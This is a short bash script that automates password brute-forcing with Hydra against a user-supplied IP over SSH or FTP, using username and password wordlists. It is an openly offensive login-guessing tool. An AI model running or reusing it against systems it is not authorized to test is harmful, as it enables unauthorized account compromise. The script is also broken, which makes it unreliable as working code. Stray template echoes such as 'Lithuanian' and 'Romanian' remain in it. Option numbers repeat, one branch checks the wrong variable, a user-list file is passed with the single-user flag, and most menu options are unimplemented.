HYDRA=/usr/bin/hydra
echo "Hydra Brute Force
=======================
"
if [ -f "$HYDRA" ]
then
echo "Options 
Option 1:ssh[1]
Option 2:ftp[2]
Option 3:mysql[3]
Option 4:mssql[4]
Option 5:rdp[5]
Option 6:telnet[6]
Option 7:smb[6]
Option 8:smtp[7]
"
read -p "Choice: " choice
read -p "IP: " ip
read -p "Wordlist location: " wordl
 
case $choice in

  1)
    echo -n "Lithuanian"
 read -p "Do you know the user(y=1/n=0): " intel
  if [ "$intel" -eq 1 ]
   then
   read -p "User: " user
   hydra -l $user -P $wordl ssh://$ip
  elif [ "$intel" -eq 0 ]
   then
   read -p "Users wordlist location: " user_loc 
   hydra -l $user_loc -P $wordl ssh://$ip
   fi

    ;;

  2)
    echo -n "Romanian"
read -p "Do you know the user(y=1/n=0): " intel_2
 if [ "$intel" -eq 1 ]
  then
  read -p "User: " user_2
  hydra -l $user_2 -P $wordl ftp://$ip
 elif [ "$intel_2" -eq 0 ]
  then
  read -p "Users wordlist location: " user_loc2 
  hydra -l $user_loc2 -P $wordl ftp://$ip
  fi  

    ;;

  3)
    echo -n "Italian"
    ;;

  4)
    echo -n "unknown"
    ;;
esac
 else
sudo apt update 
sudo apt install hydra
fi     
